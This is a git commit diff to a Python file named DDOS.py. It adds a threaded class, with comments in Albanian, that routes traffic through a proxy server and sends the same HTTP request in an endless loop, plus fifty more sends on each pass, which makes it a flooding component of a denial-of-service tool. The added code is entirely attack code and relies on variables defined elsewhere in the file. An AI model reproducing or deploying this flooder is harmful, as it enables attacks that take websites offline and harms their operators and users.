2e0a43b873313e1fd504aa0e60cee3e0b4c2f944
Leona <94569959+LeonaSyla@users.noreply.github.com>
2023-01-07 21:05:58 +0100

    Update DDOS.py

--- DDOS.py
+++ DDOS.py
@@ -154,3 +154,24 @@ class RequestDefaultHTTPS(threading.Thread):
                     s.close()
             except:
                 s.close()
+
+# Klasa në rastin kur përdoren serverat ndërmjetësues
+class RequestProxyHTTP(threading.Thread):
+    def __init__(self, counter):
+        threading.Thread.__init__(self)
+        self.counter = counter
+    def run(self):
+        go.wait()
+        while True:
+            try:
+                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                s.connect((str(proxy_ip), int(proxy_port)))
+                s.send(str.encode(request_cf))
+                print ("Kërkesa është dërguar :", self.counter)
+                try:
+                    for y in range(50):
+                        s.send(str.encode(request_cf))
+                except:
+                    pass
+            except:
+                pass
